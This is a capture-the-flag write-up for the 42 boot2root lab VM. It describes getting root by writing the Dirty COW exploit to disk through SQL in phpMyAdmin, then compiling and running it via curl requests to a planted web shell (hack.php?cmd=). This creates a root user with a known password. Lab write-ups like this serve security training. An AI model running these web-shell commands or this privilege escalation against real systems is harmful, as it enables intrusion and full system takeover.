# Dirty COW through SQL Injection

## Intro

Following these instructions will get you the Holy Grail (the root, you know) using a very beautiful and very messy way:

![Bonus way #3](https://drive.google.com/uc?export=view&id=1KalcsuE9IKLSI64LeqLpWD9eoW4cftpo)

## How to start?

Need to do steps from [Main way #1](https://github.com/MrOnimus/42_boot2root/blob/master/writeup1.md) to start after access to cmd throgh get request.

## Generating an SQL query

After this we need to run SQL [script](https://github.com/MrOnimus/42_boot2root/blob/master/scripts/dirty_cow_sql_injection.sql) in phpMyAdmin.

Given script is a Dirty COW [epxloit](https://www.exploit-db.com/exploits/40839) in form of the SQL injection script.
To comply with SQL formatting standards we've changed some symbols using this online [utility](http://www.unit-conversion.info/texttools/replace-text/). To be clear, we have made the following changes: " -> \\", ' -> \\', and \n -> \\\n .

As the lines ended with '\\' symbol and escaped symboles conflicted with each other, we couldn't compile file. 
We've worked this problem out with help of this [source](https://stackoverflow.com/questions/5268088/extra-backslash-when-select-into-outfile-in-mysql):

	LINES TERMINATED BY '\r\n'
	ESCAPED BY ''

## SQL injection execution

After that - compile and run exploit with:

	curl --insecure "https://192.168.56.102/forum/templates_c/hack.php?cmd=gcc%20-pthread%20exploit.c%20-o%20exploit%20-lcrypt"
	curl --insecure "https://192.168.56.102/forum/templates_c/hack.php?cmd=ls" //check if it correct compile
	curl --insecure "https://192.168.56.102/forum/templates_c/hack.php?cmd=./exploit%20123"

And we have firefart user with password 123 which is root. But I don't now how log in because su or su -c can't get passwd as argument.
